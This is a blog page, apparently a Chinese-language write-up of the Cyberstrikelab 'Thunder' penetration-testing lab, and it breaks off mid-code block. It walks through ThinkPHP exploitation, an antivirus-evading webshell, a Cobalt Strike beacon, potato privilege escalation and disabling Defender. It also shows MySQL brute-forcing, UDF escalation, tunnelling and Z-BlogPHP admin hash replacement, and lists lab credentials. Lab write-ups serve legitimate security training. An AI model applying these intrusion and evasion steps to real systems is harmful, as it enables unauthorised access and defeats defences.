@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Cyberstrikelab Thunder Writeup - L1nq Blog</title><meta name="author" content="L1nq">
+<meta name="description" content="Cyberstrikelab Thunder Writeup"><meta name="keywords" content='Cyberstrikelab'>
+  <meta itemprop="name" content="Cyberstrikelab Thunder Writeup">
+  <meta itemprop="description" content="Cyberstrikelab Thunder Writeup">
+  <meta itemprop="datePublished" content="2025-03-25T10:24:03+00:00">
+  <meta itemprop="dateModified" content="2026-05-01T12:09:56+08:00">
+  <meta itemprop="wordCount" content="285">
+  <meta itemprop="image" content="https://sw1mblu3.fun/1.jpg">
+  <meta itemprop="keywords" content="Cyberstrikelab"><meta property="og:url" content="https://sw1mblu3.fun/posts/cslab-thunder/">
+  <meta property="og:site_name" content="L1nq Blog">
+  <meta property="og:title" content="Cyberstrikelab Thunder Writeup">
+  <meta property="og:description" content="Cyberstrikelab Thunder Writeup">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-03-25T10:24:03+00:00">
+    <meta property="article:modified_time" content="2026-05-01T12:09:56+08:00">
+    <meta property="article:tag" content="Cyberstrikelab">
+    <meta property="og:image" content="https://sw1mblu3.fun/1.jpg">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://sw1mblu3.fun/1.jpg">
+  <meta name="twitter:title" content="Cyberstrikelab Thunder Writeup">
+  <meta name="twitter:description" content="Cyberstrikelab Thunder Writeup">
+<meta name="application-name" content="L1nq Blog">
+<meta name="apple-mobile-web-app-title" content="L1nq Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="https://sw1mblu3.fun/posts/cslab-thunder/" title="Cyberstrikelab Thunder Writeup - L1nq Blog" /><link rel="prev" type="text/html" href="https://sw1mblu3.fun/posts/polarctf-2025%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E8%B5%9B/" title="PolarCTF 2025 春季个人赛 Web Writeup" /><link rel="next" type="text/html" href="https://sw1mblu3.fun/posts/cslab-pearl/" title="Cyberstrikelab Pearl Writeup" /><link rel="alternate" type="text/markdown" href="https://sw1mblu3.fun/posts/cslab-thunder/index.md" title="Cyberstrikelab Thunder Writeup - L1nq Blog"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "Cyberstrikelab Thunder Writeup",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/sw1mblu3.fun\/posts\/cslab-thunder\/"
+    },"image": ["https:\/\/sw1mblu3.fun\/1.jpg"],"genre": "posts","keywords": "Cyberstrikelab","wordcount":  285 ,
+    "url": "https:\/\/sw1mblu3.fun\/posts\/cslab-thunder\/","datePublished": "2025-03-25T10:24:03+00:00","dateModified": "2026-05-01T12:09:56+08:00","license": "2026","publisher": {
+      "@type": "Organization",
+      "name": "L1nq Blog","logo": "https:\/\/sw1mblu3.fun\/1.jpg"},"author": {
+        "@type": "Person",
+        "name": "L1nq"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-instant-intensity="viewport" data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="L1nq Blog"><span class="header-title-text">L1nq Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/links/"><i class="fa-solid fa-link fa-sm" aria-hidden="true"></i> Links</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-user fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+              <i class="fa-solid fa-search" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+              <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" role="button" aria-label="Switch Theme" title="Switch Theme"><i class="fa-solid fa-adjust" aria-hidden="true"></i></li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="L1nq Blog"><span class="header-title-text">L1nq Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="theme-switch" role="button" aria-label="Switch Theme"><i class="fa-solid fa-adjust" aria-hidden="true"></i></div>
+      <div class="menu-toggle" id="menu-toggle-mobile" role="button" aria-labelledby="menu-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                <i class="fa-solid fa-search" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Cancel
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/links/"><i class="fa-solid fa-link fa-sm" aria-hidden="true"></i> Links</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-user fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item"><a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item menu-system"></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>Cyberstrikelab Thunder Writeup</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><a href="https://github.com/L1nq0" title="Author" target="_blank" rel="external nofollow noopener noreferrer author" class="author"><img class="avatar" src='/1.jpg' alt="L1nq" height="16" width="16">&nbsp;L1nq</a></span><span class="post-included-in">&nbsp;included in <a href="/categories/pentest-lab/" class="post-category" title="Category - Pentest Lab"><i class="fa-regular fa-folder" aria-hidden="true"></i> Pentest Lab</a></span></div><div class="post-meta-line"><span title="published on 2025-03-25 10:24:03"><i class="fa-solid fa-calendar-days me-1" aria-hidden="true"></i><time datetime="2025-03-25">2025-03-25</time></span>&nbsp;<span title="Updated on 2026-05-01 12:09:56"><i class="fa-regular fa-calendar-check me-1" aria-hidden="true"></i><time datetime="2026-05-01">2026-05-01</time></span>&nbsp;<span title="285 words"><i class="fa-solid fa-pencil-alt me-1" aria-hidden="true"></i>About 300 words</span>&nbsp;<span><i class="fa-regular fa-clock me-1" aria-hidden="true"></i>2 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#免杀上线">免杀上线</a></li>
+    <li><a href="#内网信息收集">内网信息收集</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#mysql-服务爆破">MYSQL 服务爆破</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#文件上传">文件上传</a></li>
+    <li><a href="#提权">提权</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#zimbra-xxe">Zimbra XXE</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><p>Cyberstrikelab Thunder Writeup</p>
+<h1 class="heading-element" id="第一台主机"><span>第一台主机</span>
+  <a href="#%e7%ac%ac%e4%b8%80%e5%8f%b0%e4%b8%bb%e6%9c%ba" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p><strong>信息收集</strong></p>
+<p>对边界机进行初步的信息收集
+<img loading="lazy" src='/posts/cslab-thunder/file-20250325100455931.png' alt="/posts/cslab-thunder/file-20250325100455931.png" height="602" width="867"></p>
+<p>访问 80 端口，发现是 ThinkPHP 框架
+<img loading="lazy" src='/posts/cslab-thunder/file-20250325100503620.png' alt="/posts/cslab-thunder/file-20250325100503620.png" height="455" width="861"></p>
+<p>使用 ThinkPHP 漏洞工具检测，检测出多个历史漏洞
+<img loading="lazy" src='/posts/cslab-thunder/file-20250325100516384.png' alt="/posts/cslab-thunder/file-20250325100516384.png" height="567" width="866"></p>
+<p><strong>文件包含</strong>直接读取 flag
+<img loading="lazy" src='/posts/cslab-thunder/file-20250325100525921.png' alt="/posts/cslab-thunder/file-20250325100525921.png" height="130" width="883"></p>
+<h2 class="heading-element" id="免杀上线"><span>免杀上线</span>
+  <a href="#%e5%85%8d%e6%9d%80%e4%b8%8a%e7%ba%bf" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>进一步利用，写马失败，换 <code>fputs</code> 函数写入失败，上传成功访问第一次能够成功，重新加载文件就会已经不存在
+<img loading="lazy" src='/posts/cslab-thunder/file-20250325100533557.png' alt="/posts/cslab-thunder/file-20250325100533557.png" height="540" width="868"></p>
+<p>普通一句话怎么传都失败，怀疑是被防御干掉了，尝试搞成免杀 WebShell 再上传，使用 ByPassGodzilla 生成
+<img loading="lazy" src='/posts/cslab-thunder/file-20250325100541019.png' alt="/posts/cslab-thunder/file-20250325100541019.png" height="482" width="867"></p>
+<p>命令执行成功，立刻看一下进程，发现一个 360 和 Defender
+<img loading="lazy" src='/posts/cslab-thunder/file-20250325100548413.png' alt="/posts/cslab-thunder/file-20250325100548413.png" height="119" width="872">
+<img loading="lazy" src='/posts/cslab-thunder/file-20250325100554861.png' alt="/posts/cslab-thunder/file-20250325100554861.png" height="467" width="857"></p>
+<p><code>root/root</code> 拿下数据库
+<img loading="lazy" src='/posts/cslab-thunder/file-20250325100603151.png' alt="/posts/cslab-thunder/file-20250325100603151.png" height="429" width="875"></p>
+<p>上线 CS，同样要免杀一下才能上线
+<img loading="lazy" src='/posts/cslab-thunder/file-20250325100611149.png' alt="/posts/cslab-thunder/file-20250325100611149.png" height="23" width="875"></p>
+<p>使用烂土豆提权至 <code>SYSTEM</code>，抓取 <code>Administrator</code> 管理员密码
+<img loading="lazy" src='/posts/cslab-thunder/file-20250325100617765.png' alt="/posts/cslab-thunder/file-20250325100617765.png" height="253" width="872"></p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="action-btn line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers" data-ct-tooltip><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="action-btn line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap" data-ct-tooltip><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="action-btn copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard" data-copied-text="Copied" data-ct-tooltip><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Administrator/Tp@cslKM</span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>开启并连接 3389 远程桌面，将烦人的杀软和 <code>Defender</code> 关掉
+<img loading="lazy" src='/posts/cslab-thunder/file-20250325100626598.png' alt="/posts/cslab-thunder/file-20250325100626598.png" height="553" width="871"></p>
+<h2 class="heading-element" id="内网信息收集"><span>内网信息收集</span>
+  <a href="#%e5%86%85%e7%bd%91%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="action-btn line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers" data-ct-tooltip><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="action-btn line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap" data-ct-tooltip><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="action-btn copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard" data-copied-text="Copied" data-ct-tooltip><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell arp -a</span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>双网卡，一个内网网段 <code>172.20.57.*</code>
+<img loading="lazy" src='/posts/cslab-thunder/file-20250325100636213.png' alt="/posts/cslab-thunder/file-20250325100636213.png" height="438" width="537"></p>
+<p>对 <code>172.20.57.*</code> 进行存活探测、服务及漏洞扫描
+<img loading="lazy" src='/posts/cslab-thunder/file-20250325100701081.png' alt="/posts/cslab-thunder/file-20250325100701081.png" height="645" width="863"></p>
+<h1 class="heading-element" id="第二台主机"><span>第二台主机</span>
+  <a href="#%e7%ac%ac%e4%ba%8c%e5%8f%b0%e4%b8%bb%e6%9c%ba" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><h2 class="heading-element" id="mysql-服务爆破"><span>MYSQL 服务爆破</span>
+  <a href="#mysql-%e6%9c%8d%e5%8a%a1%e7%88%86%e7%a0%b4" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>发现 <code>172.20.57.98</code> 内网机，这台机器是没有 Web 的，且没有其他任何信息。
+参考了前面参与「Thunder」限时渗透赛 的师傅的 WriteUp，好像当时有提示 <code>CSLab</code> 作为账号密码</p>
+<p>开始爆破 MYSQL 服务
+<img loading="lazy" src='/posts/cslab-thunder/file-20250325100709748.png' alt="/posts/cslab-thunder/file-20250325100709748.png" height="224" width="871"></p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="action-btn line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers" data-ct-tooltip><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="action-btn line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap" data-ct-tooltip><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="action-btn copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard" data-copied-text="Copied" data-ct-tooltip><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root/CSLab</span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>MDUT 连接，进行 UDF 提权
+<img loading="lazy" src='/posts/cslab-thunder/file-20250325100716778.png' alt="/posts/cslab-thunder/file-20250325100716778.png" height="690" width="864"></p>
+<p>这里也有 <code>Defender</code> 防御，做免杀马上线 CS
+<img loading="lazy" src='/posts/cslab-thunder/file-20250325100726442.png' alt="/posts/cslab-thunder/file-20250325100726442.png" height="266" width="864"></p>
+<p>和边界机的相关配置和系统版本一致，再次尝试使用烂土豆提权，成功
+<img loading="lazy" src='/posts/cslab-thunder/file-20250325100733957.png' alt="/posts/cslab-thunder/file-20250325100733957.png" height="42" width="867"></p>
+<p>关闭 <code>Defender</code>
+<img loading="lazy" src='/posts/cslab-thunder/file-20250325100738843.png' alt="/posts/cslab-thunder/file-20250325100738843.png" height="439" width="868"></p>
+<h1 class="heading-element" id="第三台主机"><span>第三台主机</span>
+  <a href="#%e7%ac%ac%e4%b8%89%e5%8f%b0%e4%b8%bb%e6%9c%ba" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p>内网信息收集发现 10.0.0.34 机器，<code>iox</code> 开启二层隧道代理，访问 <code>Web</code> 页面
+172.20.57.98 内网机器监听1081
+<img loading="lazy" src='/posts/cslab-thunder/file-20250325100744649.png' alt="/posts/cslab-thunder/file-20250325100744649.png" height="59" width="583">
+172.20.56.32 边界机流量转发
+<img loading="lazy" src='/posts/cslab-thunder/file-20250325100753619.png' alt="/posts/cslab-thunder/file-20250325100753619.png" height="51" width="864">
+攻击机访问
+<img loading="lazy" src='/posts/cslab-thunder/file-20250325100807752.png' alt="/posts/cslab-thunder/file-20250325100807752.png" height="313" width="868"></p>
+<p>发现版本信息 <code>Z-BlogPHP 1.7.3</code>
+<img loading="lazy" src='/posts/cslab-thunder/file-20250325100812092.png' alt="/posts/cslab-thunder/file-20250325100812092.png" height="147" width="870"></p>
+<p>翻阅 zblogphp 1.7.3 源码，发现 <code>/zb_system/function/lib/base/member.php</code> 文件中写了 <code>password</code> 的生成方式
+<img loading="lazy" src='/posts/cslab-thunder/file-20250325100818152.png' alt="/posts/cslab-thunder/file-20250325100818152.png" height="444" width="853">
+<img loading="lazy" src='/posts/cslab-thunder/file-20250325100826735.png' alt="/posts/cslab-thunder/file-20250325100826735.png" height="471" width="870"></p>
+<p>将明文密码 (<code>$ps</code>) 进行 MD5 哈希，接着将哈希值与用户唯一码（<code>$guid</code>）拼接，然后对拼接后的字符串再次 MD5 加密，得到最终的哈希值
+<img loading="lazy" src='/posts/cslab-thunder/file-20250325100833061.png' alt="/posts/cslab-thunder/file-20250325100833061.png" height="414" width="868"></p>
+<p>在第二台主机的数据库中管理着第三台机主机网站的库
+<img loading="lazy" src='/posts/cslab-thunder/file-20250325100840988.png' alt="/posts/cslab-thunder/file-20250325100840988.png" height="298" width="870"></p>
+<p>用户唯一码如下</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="action-btn line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers" data-ct-tooltip><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="action-btn line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap" data-ct-tooltip><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="action-btn copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard" data-copied-text="Copied" data-ct-tooltip><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GUID: 24d876c8772572cf839674c5a176e41c
+</span></span><span class="line"><span class="cl">name: CSLab
+</span></span><span class="line"><span class="cl">password: 6e272dff11557a1e7ad35d0fdf1162c3</span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>构造脚本，输出新的 hash 密码，将其在数据库中替换</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="action-btn line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers" data-ct-tooltip><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="action-btn line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap" data-ct-tooltip><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="action-btn copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard" data-copied-text="Copied" data-ct-tooltip><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
